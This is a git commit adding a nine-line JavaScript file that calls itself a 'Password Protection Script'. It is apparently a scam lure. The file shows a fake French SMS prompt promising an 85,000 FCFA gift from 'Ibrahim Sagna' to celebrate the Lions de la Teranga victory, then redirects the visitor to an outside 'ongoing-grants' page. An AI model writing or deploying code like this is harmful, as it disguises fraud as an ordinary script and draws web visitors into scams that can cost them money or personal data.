91890476c86ddc5948cd971d5d98fd17997ed2e3
For-All-The <peterhezekiah30@gmail.com>
2026-01-22 00:35:23 +0100

    Create activeb.js

---
+++ activeb.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'RETIRER DE L’ARGENT'
+password = prompt(
+  'SMS: Félicitations ! Vous êtes éligible pour recevoir le DON DE 85 000 FCFA DE IBRAHIM SAGNA POUR CÉLÉBRER LA VICTOIRE DES LIONS DE LA TERANGA. Veuillez appuyer sur OK pour recevoir instantanément.',
+  'RETIRER DE L’ARGENT'
+); 
+if (password != 'RETIRER DE L’ARGENT') {
+  location.href = 'https://ongoing-grants.info/Sagna-Notre-Victoire.html';
+  }
